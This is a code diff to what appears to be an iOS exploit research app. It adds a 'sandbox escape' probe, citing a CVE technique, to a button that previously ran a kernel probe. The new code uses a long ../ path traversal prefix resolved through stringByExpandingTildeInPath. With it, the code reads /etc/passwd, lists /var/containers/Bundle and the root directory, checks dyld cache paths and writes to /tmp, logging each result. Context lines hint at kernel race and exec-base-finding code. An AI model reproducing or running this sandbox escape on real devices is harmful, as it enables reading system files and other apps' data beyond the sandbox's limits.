@@ -898,7 +898,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie Kernel Probe (v205)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie + Sandbox Escape (v212)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9121,7 +9121,95 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v206: syscall + API probe ===\n"];
+        [self appendLog:@"\n=== Rie v212: syscall + API + sandbox escape probe ===\n"];
+
+        // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
+        [self appendLog:@"── Phase S: sandbox escape probe ──"];
+        {
+            // Technique: prepend ../../../../../.. then expandingTildeInPath resolves to /
+            NSString *traversalPrefix = @"../../../../../../../../../../../../../";
+
+            // Test 1: read /etc/passwd via path traversal
+            NSString *passwdRaw = [traversalPrefix stringByAppendingString:@"etc/passwd"];
+            NSString *passwdResolved = [passwdRaw stringByExpandingTildeInPath];
+            [self appendLog:[NSString stringWithFormat:@"Test 1: /etc/passwd\n  raw=%@\n  resolved=%@",
+                passwdRaw, passwdResolved]];
+
+            NSError *fsErr = nil;
+            NSString *passwdContent = [NSString stringWithContentsOfFile:passwdResolved
+                encoding:NSUTF8StringEncoding error:&fsErr];
+            if (passwdContent) {
+                // Only show first 200 chars
+                NSString *preview = [passwdContent substringToIndex:MIN(200, passwdContent.length)];
+                [self appendLog:[NSString stringWithFormat:@"  SUCCESS! Read %lu bytes: %@",
+                    (unsigned long)passwdContent.length, preview]];
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  FAIL: %@ (code=%ld)",
+                    fsErr.localizedDescription, (long)fsErr.code]];
+            }
+
+            // Test 2: dyld shared cache paths
+            NSArray *dyldPaths = @[
+                @"/System/Library/dyld/dyld_shared_cache_arm64e",
+                @"/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
+                @"/private/var/db/dyld/dyld_shared_cache_arm64e",
+            ];
+            for (NSString *dp in dyldPaths) {
+                NSString *raw = [traversalPrefix stringByAppendingString:dp];
+                NSString *resolved = [raw stringByExpandingTildeInPath];
+                BOOL exists = [[NSFileManager defaultManager] fileExistsAtPath:resolved];
+                [self appendLog:[NSString stringWithFormat:@"Test 2: %@ -> exists=%d", dp, exists]];
+                if (exists) {
+                    NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:resolved error:nil];
+                    [self appendLog:[NSString stringWithFormat:@"  size=%@", attrs[NSFileSize]]];
+                }
+            }
+
+            // Test 3: list /var/containers/Bundle (outside our container)
+            NSString *bundlesRaw = [traversalPrefix stringByAppendingString:@"var/containers/Bundle"];
+            NSString *bundlesResolved = [bundlesRaw stringByExpandingTildeInPath];
+            NSArray *bundleContents = [[NSFileManager defaultManager]
+                contentsOfDirectoryAtPath:bundlesResolved error:&fsErr];
+            if (bundleContents) {
+                [self appendLog:[NSString stringWithFormat:@"Test 3: /var/containers/Bundle -> %lu entries: %@",
+                    (unsigned long)bundleContents.count,
+                    [bundleContents componentsJoinedByString:@", "]]];
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"Test 3: /var/containers/Bundle FAIL: %@ (code=%ld)",
+                    fsErr.localizedDescription, (long)fsErr.code]];
+            }
+
+            // Test 4: write to /tmp
+            NSString *tmpTestRaw = [traversalPrefix stringByAppendingString:@"tmp/sandbox_test_rie.txt"];
+            NSString *tmpTestResolved = [tmpTestRaw stringByExpandingTildeInPath];
+            BOOL wrote = [@"rie_test" writeToFile:tmpTestResolved atomically:NO
+                encoding:NSUTF8StringEncoding error:&fsErr];
+            if (wrote) {
+                [self appendLog:[NSString stringWithFormat:@"Test 4: write to %@ -> SUCCESS", tmpTestResolved]];
+                [[NSFileManager defaultManager] removeItemAtPath:tmpTestResolved error:nil];
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"Test 4: write to /tmp FAIL: %@ (code=%ld)",
+                    fsErr.localizedDescription, (long)fsErr.code]];
+            }
+
+            // Test 5: what does ~ resolve to in sandbox?
+            NSString *tildeResolved = [@"~" stringByExpandingTildeInPath];
+            [self appendLog:[NSString stringWithFormat:@"Test 5: ~ resolves to: %@", tildeResolved]];
+
+            // Test 6: list / to see what's visible
+            NSString *rootRaw = [traversalPrefix stringByAppendingString:@"."];
+            NSString *rootResolved = [rootRaw stringByExpandingTildeInPath];
+            NSArray *rootContents = [[NSFileManager defaultManager]
+                contentsOfDirectoryAtPath:rootResolved error:&fsErr];
+            if (rootContents) {
+                [self appendLog:[NSString stringWithFormat:@"Test 6: / contents (%lu entries): %@",
+                    (unsigned long)rootContents.count,
+                    [rootContents componentsJoinedByString:@", "]]];
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"Test 6: / FAIL: %@ (code=%ld)",
+                    fsErr.localizedDescription, (long)fsErr.code]];
+            }
+        }
 
         // ── Phase A: direct syscall probe (v205) ──
         [self appendLog:@"── Phase A: direct syscall probe ──"];
